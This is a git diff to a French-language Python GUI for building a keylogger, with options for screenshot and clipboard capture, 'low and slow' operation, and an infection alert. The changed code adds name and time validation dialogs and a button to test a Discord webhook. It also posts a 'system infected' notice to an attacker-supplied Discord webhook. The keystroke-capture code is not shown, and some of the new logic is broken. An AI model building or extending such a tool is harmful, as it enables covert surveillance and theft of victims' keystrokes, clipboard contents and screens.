@@ -5,6 +5,7 @@ import customtkinter as ctk
 from tkinter import messagebox
 import requests
 
+
 historique = []
 capture_apres_at = False
 apres_at_buffer = []
@@ -18,7 +19,7 @@ ctk.set_default_color_theme("dark-blue")
 def valider_webhook():
     if webhook_entry.get() == "":
         messagebox.showerror("Erreur", "Le champ du webhook ne peut pas être vide.")
-        sys.exit(1)
+
 
 
 def activity_time_option_selected():
@@ -35,12 +36,20 @@ def activity_time_option_selected():
         fin_label.pack(pady=10)
         fin_entry = ctk.CTkEntry(heure, width=200, font=ctk.CTkFont(size=14))
         fin_entry.pack(pady=10)
-        valider_heure_btn = ctk.CTkButton(heure, text="Valider", font=ctk.CTkFont(size=14), command=heure.destroy)
+        def valider():
+            heure_debut_valide = debut_entry.get()
+            heure_fin_valide = fin_entry.get()
+            if heure_debut_valide == "" or heure_fin_valide == "":
+                messagebox.showerror("Erreur", "Les champs d'heure de début et de fin ne peuvent pas être vides.")
+                time.sleep(2)
+                heure.destroy()
+            else:
+                heure.destroy()
+                return nom_keylogs()
+        valider_heure_btn = ctk.CTkButton(heure, text="Valider", font=ctk.CTkFont(size=14), command=valider)
         valider_heure_btn.pack(pady=20)
-        if debut_entry.get() == "" or fin_entry.get() == "":
-            messagebox.showerror("Erreur", "Les champs d'heure de début et de fin ne peuvent pas être vides.")
-            time.sleep(2)
-            heure.destroy()
+        
+
 
 def nom_keylogs():
     nom_window = ctk.CTkToplevel(app)
@@ -50,15 +59,21 @@ def nom_keylogs():
     nom_label.pack(pady=10)
     nom_entry = ctk.CTkEntry(nom_window, width=200, font=ctk.CTkFont(size=14))
     nom_entry.pack(pady=10)
-    valider_nom_btn = ctk.CTkButton(nom_window, text="Valider", font=ctk.CTkFont(size=14), command=nom_window.destroy)
+    def valider():
+        nom = nom_entry.get()
+        if nom == "":
+            messagebox.showerror("Erreur", "Le champ du nom du fichier keylogs ne peut pas être vide.")
+            time.sleep(2)
+            nom_window.destroy()
+        else:
+            nom_window.destroy()
+    valider_nom_btn = ctk.CTkButton(nom_window, text="Valider", font=ctk.CTkFont(size=14), command=valider)
     valider_nom_btn.pack(pady=20)
-    if nom_entry.get() == "":
-        messagebox.showerror("Erreur", "Le champ du nom du fichier keylogs ne peut pas être vide.")
-        time.sleep(2)
-        nom_window.destroy()
+    
 
 def screenshot_option_func():
     messagebox.showinfo("Information", "L'option 'Capture d'écran' a été sélectionnée.")
+    #if screenshot_option.get() == 1:
 
 def clipboard_option_func():
     messagebox.showinfo("Information", "L'option 'Capture du presse-papier' a été sélectionnée.")
@@ -73,9 +88,41 @@ def low_and_slow_option_func():
     messagebox.showinfo("Information", "L'option 'Low and Slow' a été sélectionnée.")
 
 def alert_on_infection_option_func():
-    messagebox.showinfo("Information", "L'option 'Alerte si contamination' a été sélectionnée.")
-    if alert_on_infection_option.get() == 1 and webhook_entry.get() != "":
-        envoyer = requests.post
+    if alert_on_infection_option.get() == 1:
+        messagebox.showinfo("Information", "L'option 'Alerte si contamination' a été sélectionnée.")
+    
+        discord_webhook = webhook_entry.get()
+        if discord_webhook == "":
+            messagebox.showerror("Erreur", "Le webhook Discord ne peut pas être vide pour cette option.")
+            return
+        
+        message = {"content": "Alerte : Une contamination a été détectée sur le système infecté."}
+
+        envoyer = requests.post(discord_webhook, json=message)
+        if envoyer.status_code == 204:
+            messagebox.showinfo("Succès", "Alerte envoyée avec succès au webhook Discord.")
+        else:
+            messagebox.showerror("Erreur", f"Échec de l'envoi de l'alerte. Code d'erreur : {envoyer.status_code}")
+
+def test_webhook():
+    test = webhook_entry.get()
+    if test == "":
+        messagebox.showerror("Erreur", "Le webhook Discord ne peut pas être vide pour ce test.")
+        return
+    
+    message = {"content": "Ceci est un message de test pour vérifier le webhook Discord."}
+
+    envoyer = requests.post(test, json=message)
+    if envoyer.status_code == 204:
+        messagebox.showinfo("Succès", "Le webhook Discord fonctionne correctement.")
+    else:
+        messagebox.showerror("Erreur", f"Le webhook Discord a échoué avec le code d'erreur : {envoyer.status_code}")
+
+
+def create_keylogger():
+    nom_keylogs().get()
+    alert_on_infection_option_func()
+
         
 
 
@@ -92,6 +139,8 @@ webhook_entry = ctk.CTkEntry(app, width=400, font=ctk.CTkFont(size=14))
 webhook_entry.pack(pady=10)
 webhook_btn = ctk.CTkButton(app, text="Valider", font=ctk.CTkFont(size=14), command=valider_webhook)
 webhook_btn.pack(pady=10)
+test = ctk.CTkButton(app, text="Tester le webhook", font=ctk.CTkFont(size=14), command=test_webhook)
+test.pack(pady=10)
 
 options_label = ctk.CTkLabel(app, text="Options supplémentaires :", font=ctk.CTkFont(size=16))
 options_label.pack(pady=20)
